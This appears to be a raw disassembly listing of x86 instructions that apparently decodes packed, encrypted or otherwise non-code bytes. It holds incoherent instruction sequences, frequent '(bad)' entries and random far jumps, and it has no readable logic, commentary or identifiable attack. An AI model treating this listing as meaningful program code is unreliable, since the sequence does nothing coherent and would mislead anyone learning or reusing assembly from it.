  41fdef:	or     cl,BYTE PTR [eax-0x21c954ce]
  41fdf5:	out    0xf4,eax
  41fdf7:	mov    es,WORD PTR [ecx-0x68]
  41fdfa:	jnp    0x41fd89
  41fdfc:	push   0x6d
  41fdfe:	cld    
  41fdff:	ds daa 
  41fe01:	pop    esi
  41fe02:	ror    DWORD PTR [edx-0x4afa55a4],0x75
  41fe09:	push   ecx
  41fe0a:	les    ebx,FWORD PTR [ebx-0x37]
  41fe0d:	jecxz  0x41fdbe
  41fe0f:	jle    0x41fe1e
  41fe11:	dec    edx
  41fe12:	hlt    
  41fe13:	aad    0xb5
  41fe15:	fld    QWORD PTR [edi-0x69f9f591]
  41fe1b:	out    0x36,eax
  41fe1d:	daa    
  41fe1e:	sub    ebp,DWORD PTR [eax+0x77130c75]
  41fe24:	sahf   
  41fe25:	lahf   
  41fe26:	xor    al,0x92
  41fe28:	test   eax,0xb107b262
  41fe2d:	add    eax,0x27e67858
  41fe32:	mov    dh,BYTE PTR [ecx]
  41fe34:	sbb    esi,DWORD PTR [ebx-0x229c3f]
  41fe3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe3b:	adc    al,0x3e
  41fe3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe3e:	aam    0xc5
  41fe40:	mov    ecx,0xdaa6eb95
  41fe45:	jmp    0x6a7a:0xd7663d92
  41fe4c:	sub    eax,0x72447bb7
  41fe51:	ins    BYTE PTR es:[edi],dx
  41fe52:	bound  eax,QWORD PTR [esi-0x6d3b7487]
  41fe58:	clc    
  41fe59:	inc    ebx
  41fe5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe5b:	mov    ds:0x90423323,al
  41fe60:	rcl    BYTE PTR [edi+0x69],1
  41fe63:	test   eax,0x35be3f42
  41fe68:	int3   
  41fe69:	das    
  41fe6a:	jl     0x41fe0c
  41fe6c:	lea    eax,[ebx+0x4fec6ab2]
  41fe72:	xchg   esi,eax
  41fe73:	or     esi,edx
  41fe75:	xor    al,al
  41fe77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe78:	jns    0x41fec8
  41fe7a:	and    ebx,DWORD PTR [edi+esi*4-0x6d]
  41fe7e:	push   ss
  41fe7f:	and    BYTE PTR [ebx-0x104c0ed5],ah
  41fe85:	add    DWORD PTR [esi],esp
  41fe87:	mov    bh,0xb7
  41fe89:	or     DWORD PTR [edi+0x711f92e2],ebx
  41fe8f:	cwde   
  41fe90:	pushf  
  41fe91:	loop   0x41fe95
  41fe93:	mov    bl,0x96
  41fe95:	lock popa 
  41fe97:	sub    al,0x13
  41fe99:	mov    es,WORD PTR [eax+0x52]
  41fe9c:	dec    edi
  41fe9d:	inc    edi
  41fe9e:	push   esi
  41fe9f:	sub    ch,bl
  41fea1:	sar    BYTE PTR [eax+0x1b],cl
  41fea4:	mov    eax,ds:0x3c86a76
  41fea9:	mov    ecx,0x66b3bc61
  41feae:	bound  edx,QWORD PTR [ecx]
  41feb0:	fsubr  QWORD PTR [edi]
  41feb2:	and    edx,DWORD PTR [ebp-0x63]
  41feb5:	add    BYTE PTR [ecx+edx*1+0x50],ch
  41feb9:	test   al,0xba
  41febb:	jg     0x41feb7
  41febd:	sub    bl,BYTE PTR [ebp+esi*4-0x4f67e106]
  41fec4:	dec    ebp
  41fec5:	pop    eax
  41fec6:	and    DWORD PTR [eax-0x32cde39f],esi
  41fecc:	call   0x52f8:0xc97af4ce
  41fed3:	ins    DWORD PTR es:[edi],dx
  41fed4:	lods   al,BYTE PTR ds:[esi]
  41fed5:	scas   eax,DWORD PTR es:[edi]
  41fed6:	and    dh,BYTE PTR [esi+0x628c5424]
  41fedc:	ins    DWORD PTR es:[edi],dx
  41fedd:	mov    esp,0x8bc504c2
  41fee2:	jle    0x41ff04
  41fee4:	std    
  41fee5:	mov    eax,ds:0x38c2f897
  41feea:	push   ss
  41feeb:	sti    
  41feec:	mov    esp,0xd9aae3e8
  41fef1:	adc    eax,0xe4d67fa6
  41fef6:	lods   al,BYTE PTR ds:[esi]
  41fef7:	fbstp  TBYTE PTR [ecx]
  41fef9:	cmpxchg DWORD PTR [edx],ecx
  41fefc:	iret   
  41fefd:	out    dx,al
  41fefe:	cmp    DWORD PTR [ecx+0x28],edi
  41ff01:	xor    esi,ebp
  41ff03:	mov    ds:0x7aa83d98,eax
  41ff08:	repz and ebp,DWORD PTR [edi]
  41ff0b:	and    ebx,edi
  41ff0d:	mov    WORD PTR [eax-0x4413dbe3],cs
  41ff13:	xor    DWORD PTR [ecx],ebx
  41ff15:	cmp    BYTE PTR [edi+0x1b],al
  41ff18:	je     0x41fec6
  41ff1a:	fcmovu st,st(4)
  41ff1c:	into   
  41ff1d:	and    ebp,DWORD PTR [esi]
  41ff1f:	fistp  QWORD PTR [ecx-0x6e6d3ee2]
  41ff25:	push   eax
  41ff26:	loopne 0x41ff7c
  41ff28:	or     eax,0xd9ea436f
  41ff2d:	imul   eax,DWORD PTR [ebx-0x40],0x2b01b905
  41ff34:	scas   eax,DWORD PTR es:[edi]
  41ff35:	sub    bl,ah
  41ff37:	pop    edi
  41ff38:	cld    
  41ff39:	cli    
  41ff3a:	loopne 0x41fef1
  41ff3c:	mov    esp,esi
  41ff3e:	pop    edx
  41ff3f:	int    0xb1
  41ff41:	lock ret 0xd59a
  41ff45:	fild   DWORD PTR [ebx-0x24b0ff3e]
  41ff4b:	push   ds
  41ff4c:	jl     0x41ffc0
  41ff4e:	rcr    DWORD PTR [ebx],cl
  41ff50:	push   0xa
  41ff52:	cdq    
  41ff53:	daa    
  41ff54:	mov    bl,0x8f
  41ff56:	sbb    DWORD PTR [ecx-0x403463b9],0xffffff84
  41ff5d:	or     bl,BYTE PTR [ebx+0x46]
  41ff60:	pusha  
  41ff61:	mov    ds,WORD PTR [edi+0x290e87ec]
  41ff67:	test   BYTE PTR [esi+0x2c5f0043],ah
  41ff6d:	inc    esi
  41ff6e:	xor    bh,BYTE PTR [eax+0x49cc52f1]
  41ff74:	jmp    0x6beedebd
  41ff79:	stos   DWORD PTR es:[edi],eax
  41ff7a:	aam    0x93
  41ff7c:	inc    ecx
  41ff7d:	cmovp  ebp,DWORD PTR [esi+0x60460ca4]
  41ff84:	(bad)  
  41ff85:	mov    ecx,0x79bb8f77
  41ff8a:	cli    
  41ff8b:	xchg   DWORD PTR [eax],eax
  41ff8d:	aam    0x1e
  41ff8f:	shl    eax,1
  41ff91:	cli    
  41ff92:	mov    al,0x5
  41ff94:	push   esi
  41ff95:	or     BYTE PTR [eax+0x62e895ab],dh
  41ff9b:	arpl   WORD PTR [ebp-0x3c20e412],bp
  41ffa1:	mov    BYTE PTR [ecx-0x7dbac46f],bh
  41ffa7:	sub    ah,0x1f
  41ffaa:	inc    eax
  41ffab:	loopne 0x41ff8f
  41ffad:	aad    0xa8
  41ffaf:	dec    BYTE PTR [edx+esi*2-0x7eb97345]
  41ffb6:	loope  0x41ff38
  41ffb8:	ds scas eax,DWORD PTR es:[edi]
  41ffba:	sbb    al,0x67
  41ffbc:	icebp  
  41ffbd:	call   0x89df:0x8ffc06f0
  41ffc4:	sbb    eax,0x187ec89b
  41ffc9:	pop    edx
  41ffca:	inc    esi
  41ffcb:	sub    al,0x7
  41ffcd:	mov    cl,0x7f
  41ffcf:	cld    
  41ffd0:	xchg   esi,eax
  41ffd1:	in     eax,0x3a
  41ffd3:	jg     0x42002d
  41ffd5:	lods   al,BYTE PTR ds:[esi]
  41ffd6:	and    al,0xc1
  41ffd8:	rcl    ebp,1
  41ffda:	cld    
  41ffdb:	push   edi
  41ffdc:	loop   0x41ff98
  41ffde:	and    al,0xc2
  41ffe0:	lock stc 
  41ffe2:	repnz dec ebp
  41ffe4:	test   eax,0x288d7755
  41ffe9:	ja     0x41fff4
  41ffeb:	sub    BYTE PTR [edi-0x2a],0x35
  41ffef:	(bad)  
  41fff0:	sub    ebx,esp
  41fff2:	mov    ah,0x6d
  41fff4:	mov    edi,DWORD PTR [ecx-0x7b]
  41fff7:	xor    bl,BYTE PTR [edi-0x60]
  41fffa:	inc    edi
  41fffb:	adc    eax,0x521dd218
  420000:	jle    0x420010
  420002:	adc    ebx,esi
  420004:	setno  BYTE PTR [esi]
  420007:	clc    
  420008:	mov    esp,0x6bf8cfec
  42000d:	(bad)  
  42000e:	ja     0x420013
  420010:	xchg   esp,eax
  420011:	in     eax,dx
  420012:	outs   dx,BYTE PTR ds:[esi]
  420013:	retf   0x9f12
  420016:	imul   ebp,DWORD PTR [esi],0x21
  420019:	lods   al,BYTE PTR ds:[esi]
  42001a:	jg     0x41ffb5
  42001c:	shl    DWORD PTR [ecx],1
  42001e:	(bad)  
  42001f:	mov    gs,WORD PTR [eax+eax*2-0x3c79d5b3]
  420026:	test   BYTE PTR [ecx+esi*4+0x25],bl
  42002a:	push   cs
  42002b:	pop    edx
  42002c:	dec    ebp
  42002d:	sub    al,0xbc
  42002f:	adc    cl,BYTE PTR [ebx-0x2996b79b]
  420035:	cmp    eax,0xdfd9d17f
  42003a:	cli    
  42003b:	dec    ebx
  42003c:	mov    al,0xec
  42003e:	or     edi,DWORD PTR [ebx]
  420040:	xor    dl,dh
  420042:	fs stos BYTE PTR es:[edi],al
  420044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420045:	(bad)  
  420046:	bound  ebx,QWORD PTR [esi]
  420048:	add    eax,0x8df550d2
  42004d:	xor    dh,BYTE PTR [eax+0x35]
  420050:	dec    edi
  420051:	test   BYTE PTR [esi+0x75],bl
  420054:	inc    edx
  420055:	mov    ds:0x82f77c93,eax
  42005a:	xchg   edx,eax
  42005b:	or     al,0x30
  42005d:	jmp    0xf04cd1ab
  420062:	mov    cl,BYTE PTR [eax+ecx*1-0x27]
  420066:	sbb    eax,0x6490f05b
  42006b:	ins    DWORD PTR es:[edi],dx
  42006c:	mov    esi,DWORD PTR [edx+0x14]
  42006f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420070:	push   es
  420071:	out    dx,al
  420072:	arpl   WORD PTR [eax-0x45207a5f],bp
  420078:	test   al,0x2d
  42007a:	sbb    al,0xd
  42007c:	repnz add BYTE PTR [ebp-0x29],0x26
  420081:	cmp    al,BYTE PTR [ebx+0x13b699ac]
  420087:	inc    esp
  420088:	outs   dx,DWORD PTR ds:[esi]
  420089:	leave  
  42008a:	mov    ds,WORD PTR [ebx+0x3e2e01cc]
  420090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420091:	ret    
  420092:	adc    al,0xfd
  420094:	imul   edi,DWORD PTR [esi+0x1c],0xffffffea
  420098:	cmp    eax,0xc7f5c008
  42009d:	or     ebx,0xffffffbd
  4200a0:	jne    0x42008e
  4200a2:	cmp    edx,edx
  4200a4:	adc    esi,ebp
  4200a6:	mov    eax,0x2717931d
  4200ab:	fnstcw WORD PTR [esp+ecx*2-0x3f309652]
  4200b2:	call   0x62a72136
  4200b7:	xor    eax,esp
  4200b9:	daa    
  4200ba:	mov    WORD PTR [ebp-0x71],fs
  4200bd:	sub    esp,DWORD PTR [esi+0x23]
  4200c0:	dec    eax
  4200c1:	jo     0x4200e5
  4200c3:	push   ecx
  4200c4:	mov    ds:0xde1ed1b8,eax
  4200c9:	push   0x59
  4200cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200cc:	call   0x263c:0xaa032da4
  4200d3:	test   DWORD PTR [ecx],esi
  4200d5:	sbb    bl,BYTE PTR [eax+0x30622173]
  4200db:	dec    ebp
  4200dc:	jno    0x4200ab
  4200de:	push   ebx
  4200df:	adc    dh,BYTE PTR [esi-0x1dcd5f24]
  4200e5:	test   eax,0xf370a931
  4200ea:	or     DWORD PTR [edx-0x4d171a47],ebp
  4200f0:	neg    DWORD PTR [edx+esi*1+0x717216c7]
  4200f7:	and    cl,BYTE PTR [ecx-0x4b909181]
  4200fd:	dec    ebx
  4200fe:	test   BYTE PTR ds:0x64fe7acf,ah
  420104:	pop    edx
  420105:	add    DWORD PTR [ebx],ebx
  420107:	nop
  420108:	push   0xffffffe0
  42010a:	out    0xac,eax
  42010c:	popf   
  42010d:	mov    eax,ds
  42010f:	or     eax,0xb65704a
  420114:	sbb    edi,esi
  420116:	push   edx
  420117:	jno    0x4200d8
  420119:	inc    ebp
  42011a:	adc    DWORD PTR [ebx-0x29],0x6588418b
  420121:	mov    dh,0x9f
  420123:	lods   al,BYTE PTR ds:[esi]
  420124:	dec    eax
  420125:	sbb    DWORD PTR [ebx+esi*1],ebp
  420128:	sbb    eax,0xccbbd9ba
  42012d:	xor    esp,DWORD PTR [ebp+0x7d88e016]
  420133:	les    eax,FWORD PTR [eax]
  420135:	xchg   ecx,eax
  420136:	adc    cl,dh
  420138:	sub    al,0x1
  42013a:	mov    cl,0x1
  42013c:	int    0xab
  42013e:	outs   dx,DWORD PTR ds:[esi]
  42013f:	lock iret 
  420141:	sbb    al,0x43
  420143:	mov    al,ds:0x95858dc0
  420148:	daa    
  420149:	add    eax,0x55d3ba8c
  42014e:	imul   ebx,eax,0xb06ce8f9
  420154:	std    
  420155:	jo     0x4201bb
  420157:	shr    BYTE PTR [ebp+0x23f417b5],0x4a
  42015e:	adc    eax,DWORD PTR [edi-0x10]
  420161:	and    DWORD PTR [esp+ebp*2+0x4c],ecx
  420165:	mov    DWORD PTR [ebx+0x16],ebx
  420168:	lahf   
  420169:	pop    edx
  42016a:	mov    eax,ds:0xe7f55ae1
  42016f:	fstp   st(5)
  420171:	dec    ebp
  420172:	sahf   
  420173:	cld    
  420174:	or     DWORD PTR [ecx+0x29b8ea96],eax
  42017a:	nop
  42017b:	push   es
  42017c:	jmp    0x4201d9
  42017e:	push   esp
  42017f:	add    BYTE PTR [ebx],al
  420181:	aad    0xba
  420183:	pusha  
  420184:	mov    bh,0xa4
  420186:	inc    ecx
  420187:	shl    BYTE PTR [eax+edi*8+0x50248dce],cl
  42018e:	test   eax,0xa9e850a7
  420193:	fcomp  QWORD PTR [edx+eax*1]
  420196:	xchg   esi,eax
  420197:	mov    edi,0x316a1876
  42019c:	or     dh,BYTE PTR [esp+eax*2-0x57f72e1f]
  4201a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201a4:	fsub   QWORD PTR [edi]
  4201a6:	retf   
  4201a7:	mov    al,0xa2
  4201a9:	xlat   BYTE PTR ds:[ebx]
  4201aa:	mov    dh,0x26
  4201ac:	push   0xd016a2cd
  4201b1:	mov    edi,0x2ae1b6ac
  4201b6:	ficomp DWORD PTR [esi]
  4201b8:	adc    eax,0x907e530e
  4201bd:	dec    edi
  4201be:	fcmovne st,st(7)
  4201c0:	dec    eax
  4201c1:	dec    esi
  4201c2:	arpl   WORD PTR [esi-0x78a58283],bx
  4201c8:	adc    DWORD PTR [esi-0x4f],eax
  4201cb:	clc    
  4201cc:	lea    edx,[edi]
  4201ce:	push   ebx
  4201cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201d0:	dec    esp
  4201d1:	loop   0x4201ed
  4201d3:	xchg   esp,eax
  4201d4:	mov    ah,0x96
  4201d6:	es xchg esp,eax
  4201d8:	dec    ebp
  4201d9:	dec    ebx
  4201da:	push   edi
  4201db:	loopne 0x420211
  4201dd:	ja     0x42016e
  4201df:	lahf   
  4201e0:	ret    
  4201e1:	cli    
  4201e2:	lods   eax,DWORD PTR ds:[esi]
  4201e3:	(bad)  
  4201e4:	sbb    bh,ch
  4201e6:	es mov edx,0xf9459074
  4201ec:	std    
  4201ed:	jp     0x42019d
  4201ef:	into   
  4201f0:	lods   al,BYTE PTR ds:[esi]
  4201f1:	add    dl,BYTE PTR [ebp+0x68]
  4201f4:	mov    ecx,0xa1e84752
  4201f9:	cmp    edi,edx
  4201fb:	dec    ecx
  4201fc:	fld    DWORD PTR [edx+ebx*1-0x1f09cc75]
  420203:	xchg   edx,eax
  420204:	clc    
  420205:	je     0x420214
  420207:	xchg   ebx,eax
  420208:	adc    DWORD PTR [edi-0x46981f8],0x4ddefae4
  420212:	cld    
  420213:	or     DWORD PTR [eax+0x38],edx
  420216:	xor    DWORD PTR [ecx+0x57570f3e],0xffffff83
  42021d:	xlat   BYTE PTR ds:[ebx]
  42021e:	fisubr WORD PTR [ecx+0x45]
  420221:	add    BYTE PTR [ebx+0x7d],bl
  420224:	fnstenv [edi-0x68]
  420227:	lock out dx,al
  420229:	repnz dec esi
  42022b:	xchg   ebx,esp
  42022d:	cmp    DWORD PTR [esi],edx
  42022f:	adc    eax,0xe1725fb5
  420234:	mov    eax,0xb25a2170
  420239:	jle    0x420250
  42023b:	mov    al,0xae
  42023d:	ror    BYTE PTR [eax],0xc4
  420240:	sbb    esi,eax
  420242:	sbb    edi,DWORD PTR [edx]
  420244:	mov    ecx,0x1c21b738
  420249:	xor    dl,BYTE PTR [ebp+0x29630b0e]
  42024f:	pop    ds
  420250:	ins    DWORD PTR es:[di],dx
  420252:	stc    
  420253:	es sub eax,0x2604e031
  420259:	xchg   DWORD PTR [ebx+0x36],ebp
  42025c:	fwait
  42025d:	cmc    
  42025e:	inc    esp
  42025f:	add    al,0xd4
  420261:	or     eax,0xd2c1e067
  420266:	or     eax,0xf0c9df81
  42026b:	cwde   
  42026c:	mov    dh,0xeb
  42026e:	clc    
  42026f:	mov    ah,0x27
  420271:	jb     0x420236
  420273:	gs push esi
  420275:	mov    ds:0xd3e54df9,eax
  42027a:	mov    dl,0x67
  42027c:	(bad)  
  42027d:	xchg   edx,eax
  42027e:	mov    dl,0xe5
  420280:	pop    es
  420281:	dec    ebx
  420282:	retf   0x2e54
  420285:	pop    ds
  420286:	pop    esi
  420287:	repz adc eax,0xbafb1ecd
  42028d:	ret    0x796f
  420290:	aas    
  420291:	mov    ch,0x2b
  420293:	push   ss
  420294:	addr16 inc ebp
  420296:	fxch   st(6)
  420298:	mov    ds:0xe40bb4e,eax
  42029e:	(bad)  
  42029f:	enter  0x6159,0x0
  4202a3:	es pop es
  4202a5:	aad    0x2e
  4202a7:	leave  
  4202a8:	push   eax
  4202a9:	cs jmp 0x420235
  4202ac:	xchg   ebx,eax
  4202ad:	ins    DWORD PTR es:[edi],dx
  4202ae:	push   cs
  4202af:	mov    eax,ds:0xe639acba
  4202b4:	adc    al,0xef
  4202b6:	cmova  edi,DWORD PTR [esi+0x79]
  4202ba:	and    edx,0xffffff8d
  4202bd:	cmp    esi,DWORD PTR [ecx]
  4202bf:	cmp    ecx,DWORD PTR [ebp+0x307ca20]
  4202c5:	fs aad 0x52
  4202c8:	dec    ecx
  4202c9:	push   ecx
  4202ca:	(bad)  
  4202cb:	jns    0x4202ac
  4202cd:	loop   0x4202d0
  4202cf:	add    eax,0x16f8f5a1
  4202d4:	retf   0xdc59
  4202d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202d8:	jno    0x42029c
  4202da:	xchg   esp,eax
  4202db:	jne    0x42032b
  4202dd:	jmp    0x420265
  4202df:	fcomp  DWORD PTR [ebx-0x45]
  4202e2:	mov    ebp,0x1f3b9e93
  4202e7:	cli    
  4202e8:	aas    
  4202e9:	mov    ds:0xcd537678,eax
  4202ee:	ret    0xcf17
  4202f1:	call   0x71ec:0x1609d435
  4202f8:	adc    al,0x6
  4202fa:	inc    ebp
  4202fb:	out    0x15,eax
  4202fd:	mov    ds:0x48005ddd,al
  420302:	ds pop es
  420304:	push   edi
  420305:	nop
  420306:	jp     0x420344
  420308:	sbb    dl,0xa9
  42030b:	sbb    BYTE PTR [esp+ebp*4-0x13],0x73
  420310:	je     0x420334
  420312:	dec    DWORD PTR [eax-0x7f]
  420315:	push   ds
  420316:	adc    BYTE PTR ds:0x87a6edb,ch
  42031c:	pop    edx
  42031d:	jnp    0x42033d
  42031f:	call   0xc731722c
  420324:	xchg   ebx,eax
  420325:	and    ebx,ebp
  420327:	fcomi  st,st(3)
  420329:	sub    esi,DWORD PTR [ecx-0x50]
  42032c:	dec    esp
  42032d:	call   0xa27d:0x27f68431
  420334:	inc    al
  420336:	mov    ebp,0x19481915
  42033b:	adc    ah,bh
  42033d:	out    dx,al
  42033e:	mov    esp,DWORD PTR [eax+0x7bb2b3d3]
  420344:	test   DWORD PTR [edx+0x7b007f],edx
  42034a:	sub    dh,bl
  42034c:	dec    eax
  42034d:	test   eax,0x45e00a0c
  420352:	into   
  420353:	sbb    ebx,eax
  420355:	sbb    al,0x27
  420357:	dec    edi
  420358:	aas    
  420359:	cdq    
  42035a:	inc    edi
  42035b:	(bad)  
  42035c:	jmp    0x420368
  42035e:	inc    ebp
  42035f:	fdiv   QWORD PTR [esi]
  420361:	cmp    DWORD PTR [ebp+0x1],ebx
  420364:	mov    esp,0x1a536ac9
  420369:	jg     0x420322
  42036b:	inc    eax
  42036c:	inc    esp
  42036d:	rcl    DWORD PTR [edx+ecx*2-0x29],0x0
  420372:	jnp    0x4203cb
  420374:	adc    BYTE PTR [esi-0x14],ch
  420377:	dec    ebp
  420378:	aad    0xed
  42037a:	add    al,0xff
  42037c:	mov    ebp,0xaa62e250
  420381:	or     DWORD PTR [ecx-0xe],esi
  420384:	pop    esi
  420385:	mov    ecx,ebx
  420387:	inc    edi
  420388:	iret   
  420389:	add    dl,al
  42038b:	es leave 
  42038d:	int    0x74
  42038f:	sub    esi,esp
  420391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420392:	gs stc 
  420394:	sub    ebp,DWORD PTR [eax+edx*1-0x35fa0ebc]
  42039b:	out    dx,eax
  42039c:	mov    eax,ds:0xe224552f
  4203a1:	(bad)  
  4203a2:	sbb    eax,0xc53a53b5
  4203a7:	popa   
  4203a8:	mov    edx,0xf3ff499d
  4203ad:	pop    eax
  4203ae:	xor    al,0x4a
  4203b0:	mov    ds:0xe61defe6,eax
  4203b5:	jg     0x4203b8
  4203b7:	(bad)  
  4203b8:	push   edx
  4203b9:	pusha  
  4203ba:	push   edx
  4203bb:	in     al,0x61
  4203bd:	jnp    0x4203f2
  4203bf:	fild   DWORD PTR [eax+ebp*2-0x57]
  4203c3:	xor    eax,0x8a3fad01
  4203c8:	shl    DWORD PTR [edx+0x43700d74],0xd4
  4203cf:	cmp    BYTE PTR [edx],bh
  4203d1:	and    DWORD PTR [ebx+0x68],ecx
  4203d4:	push   esi
  4203d5:	or     cl,BYTE PTR [esi+0x64]
  4203d8:	pop    eax
  4203d9:	retf   0xca75
  4203dc:	std    
  4203dd:	xchg   BYTE PTR [ecx+0x4b3f7c],bl
  4203e3:	loop   0x420456
  4203e5:	xor    dh,ch
  4203e7:	ss pop ebp
  4203e9:	ins    DWORD PTR es:[edi],dx
  4203ea:	loope  0x420446
  4203ec:	pop    eax
  4203ed:	cmp    eax,0x496d9d5a
  4203f2:	das    
  4203f3:	in     al,0xa3
  4203f5:	sub    edx,DWORD PTR [eax+0x755ef56f]
  4203fb:	out    0x7,eax
  4203fd:	stc    
  4203fe:	out    0xe7,al
  420400:	add    BYTE PTR [edi-0xa],al
  420403:	and    dl,0xd5
  420406:	and    DWORD PTR [esi+0x24116a8f],ecx
  42040c:	adc    BYTE PTR [esi+esi*2],ch
  42040f:	push   ss
  420410:	das    
  420411:	mov    ebp,0x5783cba1
  420416:	test   DWORD PTR [ebx+0x1b],0xc198baea
  42041d:	pop    esp
  42041e:	mov    ah,0x1e
  420420:	sbb    eax,ecx
  420422:	adc    ebx,DWORD PTR [edx-0x4c]
  420425:	jo     0x420433
  420427:	mov    DWORD PTR [ebp+esi*4+0xea68d2b],esi
  42042e:	inc    eax
  42042f:	cwde   
  420430:	out    dx,eax
  420431:	pop    ds
  420432:	outs   dx,DWORD PTR ds:[esi]
  420433:	rol    DWORD PTR [eax+ecx*2-0x54e5f551],cl
  42043a:	mov    eax,ds:0x44f8875c
  42043f:	les    eax,FWORD PTR [ebp+0x44331825]
  420445:	xchg   esi,eax
  420446:	lea    esi,[edi-0x7f]
  420449:	les    ecx,FWORD PTR [esi]
  42044b:	sub    al,0x3f
  42044d:	and    edx,eax
  42044f:	cmp    eax,ebp
  420451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420452:	pop    ss
  420453:	mov    ebp,0x113dd8c8
  420458:	dec    esp
  420459:	inc    ecx
  42045a:	test   al,0xba
  42045c:	xchg   ebp,ebp
  42045e:	mov    al,BYTE PTR [esi]
  420460:	popa   
  420461:	pop    esp
  420462:	pushf  
  420463:	inc    DWORD PTR [ebx+0x19]
  420466:	cmc    
  420467:	sbb    dh,BYTE PTR [esi-0x75]
  42046a:	call   0xce6d1766
  42046f:	push   ebx
  420470:	jp     0x420484
  420472:	(bad)  
  420473:	mov    ebx,edx
  420475:	adc    eax,0x3d19831a
  42047a:	adc    BYTE PTR [edi],0x8c
  42047d:	mov    edx,0x5f432134
  420482:	jb     0x4204c0
  420484:	pop    edi
  420485:	mov    edx,0x7b4931a5
  42048a:	loope  0x420456
  42048c:	pusha  
  42048d:	popf   
  42048e:	enter  0x8d85,0x5c
  420492:	fcomp  QWORD PTR [ebp+0x15d059ad]
  420498:	rcl    DWORD PTR [ebp-0x76529acb],cl
  42049e:	xor    DWORD PTR [ecx+0x307cf5e0],ebp
  4204a4:	(bad)  
  4204a6:	in     eax,dx
  4204a7:	adc    eax,DWORD PTR [ecx-0x23]
  4204aa:	pop    ebx
  4204ab:	inc    ebp
  4204ac:	jl     0x42047b
  4204ae:	cmp    DWORD PTR [edx-0x20],edi
  4204b1:	ficom  WORD PTR [esi+0xa]
  4204b4:	jo     0x42052a
  4204b6:	fdiv   QWORD PTR [ebx-0x26]
  4204b9:	test   al,0x99
  4204bb:	stos   BYTE PTR es:[edi],al
  4204bc:	xchg   BYTE PTR [esi-0x5dcc5927],ah
  4204c2:	mov    ds:0x30fdb74e,eax
  4204c7:	retf   0xd378
  4204ca:	jp     0x4204ce
  4204cc:	mov    ebx,0x483fabec
  4204d1:	or     esp,DWORD PTR [ebx]
  4204d3:	fwait
  4204d4:	sbb    ebx,ebp
  4204d6:	pop    es
  4204d7:	dec    edi
  4204d8:	in     eax,dx
  4204d9:	outs   dx,DWORD PTR ds:[esi]
  4204da:	add    DWORD PTR [ebp+eiz*2-0x5a],ebp
  4204de:	repnz xchg ebx,eax
  4204e0:	sar    DWORD PTR [edx+0x8a258af],0x12
  4204e7:	rcl    BYTE PTR [esi],cl
  4204e9:	in     al,dx
  4204ea:	jb     0x420539
  4204ec:	fwait
  4204ed:	jne    0x42053c
  4204ef:	xor    DWORD PTR [edi],edi
  4204f1:	not    BYTE PTR [edi]
  4204f3:	outs   dx,DWORD PTR ds:[esi]
  4204f4:	popa   
  4204f5:	fisttp DWORD PTR [ecx+edx*4]
  4204f8:	sbb    eax,DWORD PTR [ebx+0x15]
  4204fb:	jae    0x420543
  4204fd:	cmp    eax,0x3a7c4e58
  420502:	imul   BYTE PTR [ebx+0x3a]
  420505:	loop   0x4204c1
  420507:	das    
  420508:	sbb    esi,DWORD PTR [edx+0x2aa98c22]
  42050e:	xor    esi,ecx
  420510:	mov    esi,0xd1fb0870
  420515:	mov    ch,0xfc
  420517:	jns    0x420576
  420519:	xchg   DWORD PTR [ecx],ecx
  42051b:	xlat   BYTE PTR ds:[ebx]
  42051c:	pop    esi
  42051d:	(bad)  
  42051e:	push   edi
  42051f:	imul   BYTE PTR [edi]
  420521:	movlps QWORD PTR [ebx],xmm0
  420524:	nop
  420525:	jae    0x42058f
  420527:	mov    bh,BYTE PTR [edx+0x2c7774ac]
  42052d:	jbe    0x420525
  42052f:	aad    0xa1
  420531:	rcl    DWORD PTR [ebx],cl
  420533:	push   ds
  420534:	add    bh,BYTE PTR [eax-0x230b2c9c]
  42053a:	push   ebp
  42053b:	mov    al,ds:0xb3113fdd
  420540:	or     eax,0x33ae96f0
  420545:	dec    edi
  420546:	shl    DWORD PTR [esi-0x7a63a60c],0x81
  42054d:	or     al,0x14
  42054f:	(bad)  [edi+0x6b]
  420552:	inc    esi
  420553:	fcom   QWORD PTR [ebx-0x7a]
  420556:	test   DWORD PTR [ebx+0x10bd264b],esi
  42055c:	lea    ebp,[ebp-0x66]
  42055f:	fild   QWORD PTR [ebx-0x624e0cbb]
  420565:	daa    
  420566:	arpl   WORD PTR [edx-0x1e],dx
  420569:	mov    bl,cl
  42056b:	repz inc esp
  42056d:	fiadd  WORD PTR [edx]
  42056f:	jp     0x4205d6
  420571:	push   esi
  420572:	pop    edx
  420573:	call   0xdc2a:0x3813ab77
  42057a:	pop    edi
  42057b:	clc    
  42057c:	push   edi
  42057d:	inc    eax
  42057e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42057f:	pop    ebx
  420580:	xchg   ebx,eax
  420581:	sbb    edi,DWORD PTR [edi+0x69]
  420584:	xchg   esp,eax
  420585:	in     eax,dx
  420586:	push   ecx
  420587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420588:	xchg   ebx,eax
  420589:	cmp    dh,dh
  42058b:	mov    ah,0x57
  42058d:	sti    
  42058e:	push   0xd0ef039b
  420593:	jns    0x420525
  420595:	mov    ch,0x11
  420597:	add    eax,0x80a7e3d2
  42059c:	push   ds
  42059d:	cli    
  42059e:	fcmovne st,st(3)
  4205a0:	pop    esi
  4205a1:	(bad)  
  4205a2:	repz hlt 
  4205a4:	cmp    esp,DWORD PTR [ebx+edx*4]
  4205a7:	imul   eax,DWORD PTR [edx-0x2f],0x197b8e51
  4205ae:	out    dx,eax
  4205af:	js     0x420613
  4205b1:	pop    ecx
  4205b2:	in     eax,0xd3
  4205b4:	xlat   BYTE PTR ds:[ebx]
  4205b5:	nop
  4205b6:	or     DWORD PTR [ebp-0x2beecf9a],ebp
  4205bc:	les    edx,FWORD PTR [ecx]
